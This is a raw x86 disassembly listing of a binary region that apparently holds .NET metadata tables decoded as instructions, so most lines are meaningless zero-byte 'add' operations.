1100667d:	xor    esi,DWORD PTR [eax]
1100667f:	xor    esi,DWORD PTR [ecx]
11006681:	cmp    DWORD PTR [eax],eax
11006683:	add    BYTE PTR [eax],al
11006685:	add    BYTE PTR ds:0x6c00,al
1100668b:	add    BYTE PTR [ebp+ecx*1+0x0],bl
1100668f:	add    BYTE PTR [ebx],ah
11006691:	jle    0x11006693
11006693:	add    al,cl
11006695:	or     eax,0x9b40000
1100669a:	add    BYTE PTR [eax],al
1100669c:	and    edx,DWORD PTR [ebx+0x74]
1100669f:	jb     0x1100670a
110066a1:	outs   dx,BYTE PTR ds:[esi]
110066a2:	addr16 jae 0x110066a5
110066a5:	add    BYTE PTR [eax],al
110066a7:	add    BYTE PTR [edi+edx*1+0x0],bh
110066ab:	add    BYTE PTR [esi+eax*1+0x0],al
110066af:	add    BYTE PTR [ebx],ah
110066b1:	push   ebp
110066b2:	push   ebx
110066b3:	add    al,al
110066b5:	sbb    eax,0x100000
110066ba:	add    BYTE PTR [eax],al
110066bc:	and    eax,DWORD PTR [edi+0x55]
110066bf:	dec    ecx
110066c0:	inc    esp
110066c1:	add    BYTE PTR [eax],al
110066c3:	add    al,dl
110066c5:	sbb    eax,0x93c0000
110066ca:	add    BYTE PTR [eax],al
110066cc:	and    eax,DWORD PTR [edx+0x6c]
110066cf:	outs   dx,DWORD PTR ds:[esi]
110066d0:	bound  eax,QWORD PTR [eax]
110066d2:	add    BYTE PTR [eax],al
110066d4:	add    BYTE PTR [eax],al
110066d6:	add    BYTE PTR [eax],al
110066d8:	add    al,BYTE PTR [eax]
110066da:	add    BYTE PTR [eax],al
110066dc:	push   edi
110066dd:	pop    ss
110066de:	mov    ds:0x10901,al
110066e3:	add    BYTE PTR [eax],al
110066e5:	cli    
110066e6:	and    eax,0x160033
110066eb:	add    BYTE PTR [ecx],al
110066ed:	add    BYTE PTR [eax],al
110066ef:	add    BYTE PTR [ecx+0x0],ah
110066f2:	add    BYTE PTR [eax],al
110066f4:	pop    es
110066f5:	add    BYTE PTR [eax],al
110066f7:	add    BYTE PTR [eax],dl
110066f9:	add    BYTE PTR [eax],al
110066fb:	add    BYTE PTR ds:0x3a000000,dh
11006701:	add    BYTE PTR [eax],al
11006703:	add    BYTE PTR [ecx],al
11006705:	add    BYTE PTR [eax],al
11006707:	add    BYTE PTR [eax+eax*1+0x160000],dh
1100670e:	add    BYTE PTR [eax],al
11006710:	sbb    DWORD PTR [eax],eax
11006712:	add    BYTE PTR [eax],al
11006714:	add    DWORD PTR [eax],eax
11006716:	add    BYTE PTR [eax],al
11006718:	add    al,BYTE PTR [eax]
1100671a:	add    BYTE PTR [eax],al
1100671c:	add    al,BYTE PTR [eax]
1100671e:	add    BYTE PTR [eax],al
11006720:	add    DWORD PTR [eax],eax
11006722:	add    BYTE PTR [eax],al
11006724:	push   es
11006725:	add    BYTE PTR [eax],al
11006727:	add    BYTE PTR [ecx],al
11006729:	add    BYTE PTR [eax],al
1100672b:	add    BYTE PTR [eax],al
1100672d:	add    BYTE PTR [ecx],cl
1100672f:	or     DWORD PTR [ecx],eax
11006731:	add    BYTE PTR [eax],al
11006733:	add    BYTE PTR [eax],al
11006735:	add    BYTE PTR [esi],al
11006737:	add    BYTE PTR [ecx],ch
11006739:	add    BYTE PTR [edx],cl
1100673b:	add    BYTE PTR [esi],al
1100673d:	add    BYTE PTR [ebp+0x0],bl
11006740:	inc    ebx
11006741:	add    BYTE PTR [esi],al
11006743:	add    BYTE PTR [eax+0x6007600],cl
11006749:	add    BYTE PTR [edi+0x6007600],bl
1100674f:	add    BYTE PTR [esi+0x6007600],bh
11006755:	add    bh,dl
11006757:	add    BYTE PTR [esi+0x0],dh
1100675a:	push   es
1100675b:	add    dl,dh
1100675d:	add    BYTE PTR [esi+0x0],dh
11006760:	push   es
11006761:	add    BYTE PTR ds:0x6010d01,ch
11006767:	add    BYTE PTR [ecx+0x1],cl
1100676a:	jbe    0x1100676c
1100676c:	push   es
1100676d:	add    BYTE PTR [ecx+eax*1+0xd],ah
11006771:	add    DWORD PTR [esi],eax
11006773:	add    BYTE PTR [edx+0x6007601],al
11006779:	add    BYTE PTR [ecx+eax*1+0x6019b],ch
11006780:	into   
11006781:	add    DWORD PTR [ebx-0x1ffedff],ebx
11006787:	add    edi,ebp
11006789:	add    DWORD PTR [edx],edx
1100678b:	add    BYTE PTR [ecx],dl
1100678d:	add    ch,bh
1100678f:	add    DWORD PTR [esi],eax
11006791:	add    BYTE PTR [ebx],dh
11006793:	add    ch,BYTE PTR [edx+eax*1]
11006796:	push   es
11006797:	add    BYTE PTR [ecx+0x2],cl
1100679a:	jbe    0x1100679c
1100679c:	push   es
1100679d:	add    BYTE PTR [edx+0x2],ah
110067a0:	jbe    0x110067a2
110067a2:	push   es
110067a3:	add    BYTE PTR [ebx+0x2],bh
110067a6:	or     eax,0x9b000601
110067ab:	add    ch,BYTE PTR [edx+eax*1]
110067ae:	push   es
110067af:	add    BYTE PTR [edx+0xa022c02],ah
110067b5:	add    BYTE PTR [edx+eax*1+0xa0000],ch
110067bc:	scas   eax,DWORD PTR es:[edi]
110067bd:	add    al,BYTE PTR [eax]
110067bf:	add    BYTE PTR [esi],al
110067c1:	add    ch,al
110067c3:	add    dh,BYTE PTR [edx-0x30fff5fe]
110067c9:	add    al,BYTE PTR [eax]
110067cb:	add    BYTE PTR [esi],al
110067cd:	add    ah,dl
110067cf:	add    ch,BYTE PTR [edx+eax*1]
110067d2:	or     al,BYTE PTR [eax]
110067d4:	loop   0x110067d8
110067d6:	add    BYTE PTR [eax],al
110067d8:	push   es
110067d9:	add    BYTE PTR [edi],al
110067db:	add    ebx,DWORD PTR [ebx+0x17000a01]
110067e1:	add    eax,DWORD PTR [eax]
110067e3:	add    BYTE PTR [esi],al
110067e5:	add    BYTE PTR [ebx+eax*1],ah
110067e8:	sub    al,0x2
110067ea:	push   es
110067eb:	add    BYTE PTR [eax+0x3],ah
110067ee:	dec    ebx
110067ef:	add    eax,DWORD PTR [esi]
110067f1:	add    BYTE PTR [esi+0xa03a403],ch
110067f7:	add    dl,al
110067f9:	add    eax,DWORD PTR [eax]
110067fb:	add    BYTE PTR [esi],al
110067fd:	add    bh,bh
110067ff:	add    ebp,DWORD PTR [edx+eax*1]
11006802:	push   es
11006803:	add    BYTE PTR [ebx],cl
11006805:	add    al,0x2c
11006807:	add    al,BYTE PTR [esi]
11006809:	add    BYTE PTR [edx],dh
1100680b:	add    al,0xb2
1100680d:	add    cl,BYTE PTR [edx]
1100680f:	add    BYTE PTR [esp+eax*1],bh
11006812:	add    BYTE PTR [eax],al
11006814:	or     al,BYTE PTR [eax]
11006816:	aas    
11006817:	add    al,0x0
11006819:	add    BYTE PTR [edx],cl
1100681b:	add    BYTE PTR [edx+0x4],al
1100681e:	add    BYTE PTR [eax],al
11006820:	or     al,BYTE PTR [eax]
11006822:	inc    ebp
11006823:	add    al,0x0
11006825:	add    BYTE PTR [esi],al
11006827:	add    BYTE PTR [eax+0x4],cl
1100682a:	mov    dl,0x2
1100682c:	push   es
1100682d:	add    BYTE PTR [esp+eax*1+0x2c],dl
11006831:	add    cl,BYTE PTR [edx]
11006833:	add    ah,al
11006835:	add    al,0x0
11006837:	add    BYTE PTR [edx],cl
11006839:	add    ch,dl
1100683b:	add    al,0x0
1100683d:	add    BYTE PTR [esi],al
1100683f:	add    dl,ch
11006841:	add    al,0x2c
11006843:	add    al,BYTE PTR [esi]
11006845:	add    BYTE PTR [ebx],cl
11006847:	add    eax,0x603a4
1100684c:	sbb    DWORD PTR ds:0x603a4,eax
11006852:	and    al,BYTE PTR ds:0x603a4
11006858:	sub    eax,0xa03a405
1100685d:	add    BYTE PTR [edx],bh
1100685f:	add    eax,0xa0000
11006864:	cmp    eax,0x16000005
11006869:	add    BYTE PTR [eax+0x12056d05],dl
1100686f:	add    BYTE PTR [edi+0x601ef05],bl
11006875:	add    BYTE PTR [eax+0x6022c05],dh
1100687b:	add    bh,dl
1100687d:	add    eax,0x605c6
11006882:	or     al,0x6
11006884:	sub    al,0x2
11006886:	push   ss
11006887:	add    BYTE PTR ds:0xe062206,bh
1100688d:	add    BYTE PTR [esi+0x6],bl
11006890:	push   ebx
11006891:	push   es
11006892:	sbb    al,BYTE PTR [eax]
11006894:	push   0x12022c06
11006899:	add    BYTE PTR [ebp+0xe066c06],al
1100689f:	add    BYTE PTR [eax+0x6065306],bl
110068a5:	add    BYTE PTR [esi+eax*1+0xe03a4],ah
110068ac:	mov    cl,0x6
110068ae:	push   ebx
110068af:	push   es
110068b0:	sbb    al,BYTE PTR [eax]
110068b2:	mov    edi,0x12022c06
110068b7:	add    bh,al
110068b9:	push   es
110068ba:	out    dx,eax
110068bb:	add    DWORD PTR [esi],ecx
110068bd:	add    al,dh
110068bf:	push   es
110068c0:	push   ebx
110068c1:	push   es
110068c2:	push   es
110068c3:	add    BYTE PTR [ebx],al
110068c5:	pop    es
110068c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
110068c7:	add    ecx,DWORD PTR [esi]
110068c9:	add    BYTE PTR [esi],cl
110068cb:	pop    es
110068cc:	push   ebx
110068cd:	push   es
110068ce:	push   cs
110068cf:	add    BYTE PTR [esi],dl
110068d1:	pop    es
110068d2:	push   ebx
110068d3:	push   es
110068d4:	push   cs
110068d5:	add    BYTE PTR [ecx],dh
110068d7:	pop    es
110068d8:	push   ebx
110068d9:	push   es
110068da:	or     al,BYTE PTR [eax]
110068dc:	mov    eax,DWORD PTR [edi]
110068de:	add    BYTE PTR [eax],al
110068e0:	or     al,BYTE PTR [eax]
110068e2:	mov    es,WORD PTR [edi]
110068e4:	add    BYTE PTR [eax],al
110068e6:	or     al,BYTE PTR [eax]
110068e8:	xchg   ecx,eax
110068e9:	pop    es
110068ea:	add    BYTE PTR [eax],al
110068ec:	or     al,BYTE PTR [eax]
110068ee:	xchg   edi,eax
110068ef:	pop    es
110068f0:	add    BYTE PTR [eax],al
110068f2:	or     al,BYTE PTR [eax]
110068f4:	call   0xa300:0x6000007
110068fb:	pop    es
110068fc:	sub    al,0x2
110068fe:	or     al,BYTE PTR [eax]
11006900:	mov    dh,0x7
11006902:	add    BYTE PTR [eax],al
11006904:	adc    al,BYTE PTR [eax]
11006906:	lds    eax,FWORD PTR [edi]
11006908:	out    dx,eax
11006909:	add    DWORD PTR [esi],edx
1100690b:	add    dh,dl
1100690d:	pop    es
1100690e:	add    BYTE PTR [eax],al
11006910:	adc    al,BYTE PTR [eax]
11006912:	fld    DWORD PTR [edi]
11006914:	out    dx,eax
11006915:	add    DWORD PTR [edx],edx
11006917:	add    dl,ch
11006919:	pop    es
1100691a:	out    dx,eax
1100691b:	add    DWORD PTR [esi],edx
1100691d:	add    BYTE PTR [ebx],al
1100691f:	or     BYTE PTR [eax],al
11006921:	add    BYTE PTR [edx],cl
11006923:	add    BYTE PTR [esi],al
11006925:	or     BYTE PTR [eax],al
11006927:	add    BYTE PTR [esi],dl
11006929:	add    BYTE PTR [ecx],cl
1100692b:	or     BYTE PTR [eax],al
1100692d:	add    BYTE PTR [esi],dl
1100692f:	add    BYTE PTR [eax+ecx*1],cl
11006932:	add    BYTE PTR [eax],al
11006934:	push   ss
11006935:	add    BYTE PTR [edi],cl
11006937:	or     BYTE PTR [eax],al
11006939:	add    BYTE PTR [esi],dl
1100693b:	add    BYTE PTR [edx],dl
1100693d:	or     BYTE PTR [eax],al
1100693f:	add    BYTE PTR [esi],dl
11006941:	add    BYTE PTR [eax+0x16000007],ah
11006947:	add    BYTE PTR [eax+ecx*1],dl
1100694a:	add    BYTE PTR [eax],al
1100694c:	push   es
1100694d:	add    BYTE PTR [edi],ah
1100694f:	or     BYTE PTR [edi],dl
11006951:	or     BYTE PTR [esi],al
11006953:	add    BYTE PTR [ebp+0x8],ah
11006956:	pop    ss
11006957:	or     BYTE PTR [esi],al
11006959:	add    BYTE PTR [ebp+0x16022c08],bl
1100695f:	add    BYTE PTR [esi+0x16062208],ah
11006965:	add    BYTE PTR [edx+0x1a062208],ch
1100696b:	add    cl,dl
1100696d:	or     BYTE PTR [ebx-0x1ffff9f8],bh
11006973:	or     BYTE PTR [edx+eax*1],ch
11006976:	push   es
11006977:	add    al,bh
11006979:	or     BYTE PTR [edx+eax*1],ch
1100697c:	add    BYTE PTR [eax],al
1100697e:	add    BYTE PTR [eax],al
11006980:	add    DWORD PTR [eax],eax
11006982:	add    BYTE PTR [eax],al
11006984:	add    BYTE PTR [eax],al
11006986:	add    DWORD PTR [eax],eax
11006988:	add    DWORD PTR [eax],eax
1100698a:	add    DWORD PTR [ecx],eax
1100698c:	adc    BYTE PTR [eax],al
1100698e:	inc    edi
1100698f:	or     DWORD PTR [eax],eax
11006991:	add    BYTE PTR [ebp+0x0],dl
11006994:	add    DWORD PTR [eax],eax
11006996:	add    DWORD PTR [eax],eax
11006998:	add    DWORD PTR [ecx],eax
1100699a:	adc    BYTE PTR [eax],al
1100699c:	pop    esp
1100699d:	or     DWORD PTR [eax],eax
1100699f:	add    BYTE PTR [ecx+0x0],dl
110069a2:	add    eax,DWORD PTR [eax]
110069a4:	add    al,0x0
110069a6:	add    DWORD PTR [ecx],eax
110069a8:	adc    BYTE PTR [eax],al
110069aa:	pop    esi
110069ab:	or     DWORD PTR [eax],eax
110069ad:	add    BYTE PTR [ecx+0x0],dl
110069b0:	adc    BYTE PTR [eax],al
110069b2:	push   ds
110069b3:	add    BYTE PTR [ecx],al
110069b5:	add    DWORD PTR [eax],edx
110069b7:	add    BYTE PTR [ecx+0x9],ah
110069ba:	add    BYTE PTR [eax],al
110069bc:	push   ecx
110069bd:	add    BYTE PTR [eax],dl
110069bf:	add    BYTE PTR [edi],ah
110069c1:	add    BYTE PTR [ecx+0x63000000],ah
110069c7:	or     DWORD PTR [eax],eax
110069c9:	add    BYTE PTR [eax],al
110069cb:	add    BYTE PTR [eax],dl
110069cd:	add    BYTE PTR [ecx],dh
110069cf:	add    BYTE PTR [ecx],al
110069d1:	add    BYTE PTR [eax],dl
110069d3:	add    BYTE PTR [esi+0x9],ah
110069d6:	add    BYTE PTR [eax],al
110069d8:	push   ecx
110069d9:	add    BYTE PTR [eax],dl
110069db:	add    BYTE PTR [ebx],dh
110069dd:	add    BYTE PTR [ecx],al
110069df:	add    dl,dl
110069e1:	add    cl,ah
110069e3:	add    DWORD PTR [ecx],eax
110069e5:	add    BYTE PTR [ecx+0x4],dh
110069e8:	add    dl,BYTE PTR fs:[ecx]
110069eb:	add    dl,dl
110069ed:	add    ch,BYTE PTR [ebp+0x2]
110069f0:	adc    eax,DWORD PTR [eax]
110069f2:	rol    BYTE PTR [edx],cl
110069f4:	int3   
110069f5:	add    DWORD PTR [ebx],edx
110069f7:	add    dl,dl
110069f9:	add    dh,BYTE PTR [ecx+0x2]
110069fc:	adc    eax,DWORD PTR [eax]
110069fe:	outs   dx,DWORD PTR ds:[esi]
110069ff:	add    al,0x71
11006a01:	add    dl,BYTE PTR [ebx]
11006a03:	add    BYTE PTR [edi+0x4],ch
11006a06:	int3   
11006a07:	add    DWORD PTR [ebx],edx
11006a09:	add    BYTE PTR [ecx+0x4],dh
11006a0c:	jno    0x11006a10
11006a0e:	adc    eax,DWORD PTR [eax]
11006a10:	dec    esi
11006a11:	add    eax,0x130271
11006a16:	dec    ecx
11006a17:	add    eax,0x130271
11006a1c:	nop
11006a1d:	add    al,0x71
11006a1f:	add    dl,BYTE PTR [ecx]
11006a21:	add    dl,ah
11006a23:	add    dh,BYTE PTR [ecx+0x2]
11006a26:	adc    DWORD PTR [eax],eax
11006a28:	imul   ecx,DWORD PTR [ecx],0x110271
11006a2e:	imul   ecx,DWORD PTR [ecx],0x71
11006a31:	add    dl,BYTE PTR [ecx]
11006a33:	add    BYTE PTR [ebp+0x9],ch
11006a36:	jno    0x11006a3a
11006a38:	add    DWORD PTR [eax],eax
11006a3a:	rol    BYTE PTR [edx],cl
11006a3c:	int3   
11006a3d:	add    eax,edx
11006a3f:	and    BYTE PTR [eax],al
11006a41:	add    BYTE PTR [eax],al
11006a43:	add    BYTE PTR [esi+0x67003d18],al
11006a49:	add    al,BYTE PTR [ecx]
11006a4b:	add    ah,dh
11006a4d:	and    BYTE PTR [eax],al
11006a4f:	add    BYTE PTR [eax],al
11006a51:	add    BYTE PTR [esi-0x65fd2e00],al
11006a57:	add    BYTE PTR [ebx],al
11006a59:	add    BYTE PTR [eax],cl
11006a5b:	and    DWORD PTR [eax],eax
11006a5d:	add    BYTE PTR [eax],al
11006a5f:	add    BYTE PTR [esi+0x3d047100],al
11006a65:	add    BYTE PTR [ebx],al
11006a67:	add    BYTE PTR [ecx+eiz*1],bl
11006a6a:	add    BYTE PTR [eax],al
11006a6c:	add    BYTE PTR [eax],al
11006a6e:	sbb    DWORD PTR [eax],0xb003d
11006a74:	add    eax,DWORD PTR [eax]
11006a76:	xor    al,0x21
11006a78:	add    BYTE PTR [eax],al
11006a7a:	add    BYTE PTR [eax],al
11006a7c:	xchg   ebx,eax
11006a7d:	add    dl,dl
11006a7f:	add    dh,BYTE PTR [edx+eax*1+0x3]
11006a83:	add    BYTE PTR [eax+0x39],bh
11006a86:	add    BYTE PTR [eax],al
11006a88:	add    BYTE PTR [eax],al
11006a8a:	xchg   ecx,eax
11006a8b:	add    dl,dl
11006a8d:	add    bh,BYTE PTR [edi+0x2]
11006a90:	push   es
11006a91:	add    BYTE PTR [eax],ah
11006a93:	cmp    al,0x0
11006a95:	add    BYTE PTR [eax],al
11006a97:	add    BYTE PTR [ecx-0x45fd2e00],dl
11006a9d:	add    DWORD PTR [ecx],ecx
11006a9f:	add    al,ah
11006aa1:	cmp    al,0x0
11006aa3:	add    BYTE PTR [eax],al
11006aa5:	add    BYTE PTR [ecx+0x6802d200],dl
11006aab:	add    BYTE PTR [edx],cl
11006aad:	add    BYTE PTR [eax+0x3d],ch
11006ab3:	add    BYTE PTR [ecx-0x71f68500],dl
11006ab9:	add    BYTE PTR [ebx],cl
11006abb:	add    al,ah
11006abd:	cmp    eax,0x0
11006ac2:	xchg   ecx,eax
11006ac3:	add    BYTE PTR [ebp+0x9],bh
11006ac6:	mov    es,WORD PTR [eax]
11006ac8:	or     al,0x0
11006aca:	sbb    al,0x3e
11006acc:	add    BYTE PTR [eax],al
11006ace:	add    BYTE PTR [eax],al
11006ad0:	xchg   ecx,eax
11006ad1:	add    dl,dl
11006ad3:	add    cl,BYTE PTR [eax+0x74000d02]
11006ad9:	inc    eax
11006ada:	add    BYTE PTR [eax],al
11006adc:	add    BYTE PTR [eax],al
11006ade:	xchg   ecx,eax
11006adf:	add    BYTE PTR [ebp+0x9],ch
11006ae2:	mov    es,WORD PTR [eax]
11006ae4:	ltr    sp
11006ae7:	inc    eax
11006ae8:	add    BYTE PTR [eax],al
11006aea:	add    BYTE PTR [eax],al
11006aec:	xchg   ecx,eax
11006aed:	add    BYTE PTR [ebx+0x9],ch
11006af0:	mov    es,WORD PTR [eax]
11006af2:	adc    BYTE PTR [eax],al
11006af4:	adc    BYTE PTR [ecx+0x0],al
11006af7:	add    BYTE PTR [eax],al
11006af9:	add    BYTE PTR [ecx-0x71f69700],dl
11006aff:	add    BYTE PTR [ecx],dl
11006b01:	add    BYTE PTR [eax+0x4b],dh
11006b07:	add    BYTE PTR [ecx-0x71fd1e00],dl
11006b0d:	add    BYTE PTR [edx],dl
11006b0f:	add    al,bl
11006b11:	dec    ebx
11006b12:	add    BYTE PTR [eax],al
11006b14:	add    BYTE PTR [eax],al
11006b16:	xchg   ecx,eax
11006b17:	add    BYTE PTR [eax+0x13008e04],dl
11006b1d:	add    BYTE PTR [eax],al
11006b1f:	dec    esp
11006b20:	add    BYTE PTR [eax],al
11006b22:	add    BYTE PTR [eax],al
11006b24:	xchg   ecx,eax
11006b25:	add    BYTE PTR [ecx+0x5],cl
11006b28:	mov    es,WORD PTR [eax]
11006b2a:	adc    al,0x0
11006b2c:	sbb    al,0x4c
11006b2e:	add    BYTE PTR [eax],al
11006b30:	add    BYTE PTR [eax],al
11006b32:	xchg   ecx,eax
11006b33:	add    BYTE PTR [esi+0x5],cl
11006b36:	mov    es,WORD PTR [eax]
11006b38:	adc    eax,0x4d7400
11006b3d:	add    BYTE PTR [eax],al
11006b3f:	add    BYTE PTR [ecx-0x6ffb8f00],dl
11006b45:	add    dl,BYTE PTR [esi]
11006b47:	add    BYTE PTR [ebp+ecx*2+0x0],dl
11006b4e:	xchg   ecx,eax
11006b4f:	add    BYTE PTR [ecx+0x4],dh
11006b52:	mov    es,WORD PTR [eax]
11006b54:	push   ss
11006b55:	add    al,cl
11006b57:	dec    ebp
11006b58:	add    BYTE PTR [eax],al
11006b5a:	add    BYTE PTR [eax],al
11006b5c:	xchg   ecx,eax
11006b5d:	add    BYTE PTR [edi+0x4],ch
11006b60:	mov    es,WORD PTR [eax]
11006b62:	pop    ss
11006b63:	add    ah,bh
11006b65:	dec    ebp
11006b66:	add    BYTE PTR [eax],al
11006b68:	add    BYTE PTR [eax],al
11006b6a:	xchg   esi,eax
11006b6b:	add    dl,dl
11006b6d:	add    cl,BYTE PTR [esi+0x38001800]
11006b73:	dec    esi
11006b74:	add    BYTE PTR [eax],al
11006b76:	add    BYTE PTR [eax],al
11006b78:	xchg   ecx,eax
11006b79:	add    dl,dl
11006b7b:	add    dl,BYTE PTR [edx+eax*1+0x4f000019]
11006b82:	add    BYTE PTR [eax],al
11006b84:	add    BYTE PTR [eax],al
11006b86:	xchg   ecx,eax
11006b87:	add    dl,dl
11006b89:	add    bl,BYTE PTR [edx-0x53ffe5fe]
11006b8f:	push   eax
11006b90:	add    BYTE PTR [eax],al
11006b92:	add    BYTE PTR [eax],al
11006b94:	xchg   ecx,eax
11006b95:	add    dl,dl
11006b97:	add    ah,BYTE PTR [edx-0x13ffe3fe]
11006b9d:	push   eax
11006b9e:	add    BYTE PTR [eax],al
11006ba0:	add    BYTE PTR [eax],al
11006ba2:	xchg   ecx,eax
11006ba3:	add    dl,dl
11006ba5:	add    ch,BYTE PTR [ecx+0x18001d02]
11006bab:	push   ebx
11006bac:	add    BYTE PTR [eax],al
11006bae:	add    BYTE PTR [eax],al
11006bb0:	xchg   ecx,eax
11006bb1:	add    BYTE PTR [edi+0x4],ch
11006bb4:	nop
11006bb5:	add    bl,BYTE PTR [edi]
11006bb7:	add    BYTE PTR [ebx+edx*2+0x0],bh
11006bbe:	xchg   ecx,eax
11006bbf:	add    dl,dl
11006bc1:	add    dl,BYTE PTR [eax-0x1fffe0fe]
11006bc7:	push   ebp
11006bc8:	add    BYTE PTR [eax],al
11006bca:	add    BYTE PTR [eax],al
11006bcc:	xchg   ebx,eax
11006bcd:	add    BYTE PTR [edi+0x9],bh
11006bd0:	mov    cl,0x2
11006bd2:	pop    ds
11006bd3:	add    BYTE PTR [eax+0x56],cl
11006bd6:	add    BYTE PTR [eax],al
11006bd8:	add    BYTE PTR [eax],al
11006bda:	sbb    DWORD PTR [eax],0xb003d
11006be0:	and    DWORD PTR [eax],eax
11006be2:	pusha  
11006be3:	push   esi
11006be4:	add    BYTE PTR [eax],al
11006be6:	add    BYTE PTR [eax],al
11006be8:	xchg   ebx,eax
11006be9:	add    BYTE PTR [edi+0x4],ch
11006bec:	mov    bh,0x2
11006bee:	and    DWORD PTR [eax],eax
11006bf0:	rcl    BYTE PTR [esi+0x0],0x0
11006bf4:	add    BYTE PTR [eax],al
11006bf6:	xchg   ebx,eax
11006bf7:	add    dl,dl
11006bf9:	add    bh,BYTE PTR [ebp-0xfffddfe]
11006bff:	pop    eax
11006c00:	add    BYTE PTR [eax],al
11006c02:	add    BYTE PTR [eax],al
11006c04:	xchg   ebx,eax
11006c05:	add    dl,dl
11006c07:	add    al,bl
11006c09:	add    ah,BYTE PTR [ebx]
11006c0b:	add    BYTE PTR [eax],cl
11006c0d:	pop    ecx
11006c0e:	add    BYTE PTR [eax],al
11006c10:	add    BYTE PTR [eax],al
11006c12:	xchg   ecx,eax
11006c13:	add    dl,dl
11006c15:	add    bl,BYTE PTR [ecx]
11006c17:	add    DWORD PTR [esi],esp
11006c19:	add    BYTE PTR [edx+ebx*2],ch
11006c1c:	add    BYTE PTR [eax],al
11006c1e:	add    BYTE PTR [eax],al
11006c20:	xchg   ecx,eax
11006c21:	add    dl,dl
11006c23:	add    cl,bl
11006c25:	add    ah,BYTE PTR [esi]
11006c27:	add    BYTE PTR [eax+0x5a],ah
11006c2a:	add    BYTE PTR [eax],al
11006c2c:	add    BYTE PTR [eax],al
11006c2e:	xchg   ecx,eax
11006c2f:	add    dl,dl
11006c31:	add    dl,dl
11006c33:	add    ch,BYTE PTR [eax]
11006c35:	add    BYTE PTR [ebx+ebx*2+0x0],cl
11006c39:	add    BYTE PTR [eax],al
11006c3b:	add    BYTE PTR [ecx-0x27fd2e00],dl
11006c41:	add    ch,BYTE PTR [ecx]
11006c43:	add    ah,dh
11006c45:	pop    ebp
11006c46:	add    BYTE PTR [eax],al
11006c48:	add    BYTE PTR [eax],al
11006c4a:	xchg   ebx,eax
11006c4b:	add    dl,dl
11006c4d:	add    dh,BYTE PTR [edi+0x34002b02]
11006c53:	pop    esi
11006c54:	add    BYTE PTR [eax],al
11006c56:	add    BYTE PTR [eax],al
11006c58:	sbb    DWORD PTR [eax],0xb003d
11006c5e:	sub    al,0x0
11006c60:	dec    esp
11006c61:	pop    esi
11006c62:	add    BYTE PTR [eax],al
11006c64:	add    BYTE PTR [eax],al
11006c66:	xchg   ecx,eax
11006c67:	add    dl,dl
11006c69:	add    ah,cl
11006c6b:	add    ch,BYTE PTR [eax+eax*1]
11006c6e:	mov    ah,0x62
11006c70:	add    BYTE PTR [eax],al
11006c72:	add    BYTE PTR [eax],al
11006c74:	xchg   ecx,eax
11006c75:	add    BYTE PTR [edi+0x4],ch
11006c78:	nop
11006c79:	add    ch,BYTE PTR ds:0x631800
11006c7f:	add    BYTE PTR [eax],al
11006c81:	add    BYTE PTR [ecx+0x1902d200],dl
11006c87:	add    DWORD PTR ds:0x650800,ebp
11006c8d:	add    BYTE PTR [eax],al
11006c8f:	add    BYTE PTR [ecx-0x13fd2e00],dl
11006c95:	add    ch,BYTE PTR ds:0x651b00
11006c9b:	add    BYTE PTR [eax],al
11006c9d:	add    BYTE PTR [ecx-0x48fb9100],dl
11006ca3:	add    ch,BYTE PTR [esi]
11006ca5:	add    BYTE PTR [esi],bl
11006ca7:	add    BYTE PTR gs:[eax],al
11006caa:	add    BYTE PTR [eax],al
11006cac:	xchg   ecx,eax
11006cad:	add    dl,dl
11006caf:	add    dl,BYTE PTR [edx+eax*1+0x6521002f]
11006cb6:	add    BYTE PTR [eax],al
11006cb8:	add    BYTE PTR [eax],al
11006cba:	xchg   ecx,eax
11006cbb:	add    dl,dl
11006cbd:	add    dl,BYTE PTR [eax+0x24003002]
11006cc3:	add    BYTE PTR gs:[eax],al
11006cc6:	add    BYTE PTR [eax],al
11006cc8:	xchg   ecx,eax
11006cc9:	add    dl,dl
11006ccb:	add    dh,BYTE PTR [edi+0x7d003002]
11006cd1:	add    BYTE PTR gs:[eax],al
11006cd4:	add    BYTE PTR [eax],al
11006cd6:	xchg   ecx,eax
11006cd7:	add    dl,dl
11006cd9:	add    cl,BYTE PTR [esi+0x3100]
11006cdf:	add    BYTE PTR [eax],al
11006ce1:	add    BYTE PTR [eax],al
11006ce3:	add    dh,al
11006ce5:	add    eax,0x2f20981
11006cea:	xor    al,BYTE PTR [eax]
11006cec:	add    BYTE PTR [eax],al
11006cee:	add    BYTE PTR [eax],al
11006cf0:	add    BYTE PTR [eax],al
11006cf2:	(bad)  
11006cf3:	or     eax,0xb20988
11006cf8:	add    BYTE PTR ss:[eax+0x65],al
11006cff:	add    BYTE PTR [esi+0x6003d18],al
11006d05:	add    BYTE PTR [esi],dh
11006d07:	add    BYTE PTR [eax+0x65],ah
11006d0d:	add    dh,ah
11006d0f:	add    DWORD PTR [ecx+0x3702f209],eax
11006d15:	add    BYTE PTR [esi+eiz*2+0x0],dl
11006d19:	add    BYTE PTR [eax],al
11006d1b:	add    dh,ah
11006d1d:	or     DWORD PTR [eax+0x3b00b209],ecx
11006d23:	add    BYTE PTR [eax],al
11006d25:	add    BYTE PTR [ecx],al
11006d27:	add    dl,dl
11006d29:	add    al,BYTE PTR [eax]
11006d2b:	add    BYTE PTR [edx],al
11006d2d:	add    BYTE PTR [ecx+0x4],dh
11006d30:	add    BYTE PTR [eax],al
11006d32:	add    DWORD PTR [eax],eax
11006d34:	outs   dx,DWORD PTR ds:[esi]
11006d35:	or     DWORD PTR [eax],eax
11006d37:	add    BYTE PTR [edx],al
11006d39:	add    BYTE PTR [ebx+0x9],dh
11006d3c:	add    BYTE PTR [eax],al
11006d3e:	add    eax,DWORD PTR [eax]
11006d40:	ja     0x11006d4b
11006d42:	add    BYTE PTR [eax],al
11006d44:	add    DWORD PTR [eax],eax
11006d46:	outs   dx,DWORD PTR ds:[esi]
11006d47:	or     DWORD PTR [eax],eax
11006d49:	add    BYTE PTR [edx],al
11006d4b:	add    BYTE PTR [ebx+0x9],dh
11006d4e:	add    BYTE PTR [eax],al
11006d50:	add    eax,DWORD PTR [eax]
11006d52:	ja     0x11006d5d
11006d54:	add    BYTE PTR [eax],al
11006d56:	add    DWORD PTR [eax],eax
11006d58:	outs   dx,DWORD PTR ds:[esi]
11006d59:	or     DWORD PTR [eax],eax
11006d5b:	add    BYTE PTR [ecx],al
11006d5d:	add    BYTE PTR [edi+0x9],ch
11006d60:	add    BYTE PTR [eax],al
11006d62:	add    DWORD PTR [eax],eax
11006d64:	outs   dx,DWORD PTR ds:[esi]
11006d65:	or     DWORD PTR [eax],eax
11006d67:	add    BYTE PTR [ecx],al
